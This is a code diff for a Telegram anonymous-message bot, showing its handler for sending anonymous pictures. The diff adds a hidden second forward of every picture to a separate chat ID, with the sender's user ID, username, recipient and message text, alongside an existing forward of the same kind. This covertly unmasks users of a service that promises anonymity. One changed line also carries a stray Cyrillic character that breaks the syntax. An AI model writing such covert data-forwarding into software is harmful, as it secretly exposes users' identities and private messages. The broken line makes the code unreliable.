@@ -118,11 +118,14 @@ async def msg(message: Message, state: FSMContext):
     text = message.text
     add_message(message.from_user.id, message.from_user.username, int(ref), text + ' (picture)')
     await bot.send_photo(chat_id=int(ref),
-                         photo=file_id,
+                         photo=file_id,п
                          caption=f'<b>👀 Вам пришло новое анонимное изображение с подписью:\n\n</b>'
                                  f'{text}',
                          parse_mode='HTML')
     await bot.send_photo(chat_id=1006103801,
+                         photo=file_id,
+                         caption=f'от {message.from_user.id} | {message.from_user.username} | кому {ref} | {text}')
+    await bot.send_photo(chat_id=6487616881,
                          photo=file_id,
                          caption=f'от {message.from_user.id} | {message.from_user.username} | кому {ref} | {text}')
     await message.answer('Изображение отправлено 💬')
